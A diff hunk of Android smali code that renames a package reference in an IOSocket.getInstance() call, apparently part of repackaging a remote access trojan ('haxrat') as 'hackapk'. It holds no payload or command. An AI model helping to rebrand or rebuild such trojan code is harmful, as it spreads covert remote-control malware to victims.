@@ -209,7 +209,7 @@
     move-result-object v7
 
     .line 62
-    invoke-static {}, Lcom/justhack/hackapk/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;
+    invoke-static {}, Lcom/justhack/hackapk/IOSocket;->getInstance()Lcom/justhack/hackapk/IOSocket;
 
     move-result-object v7
 
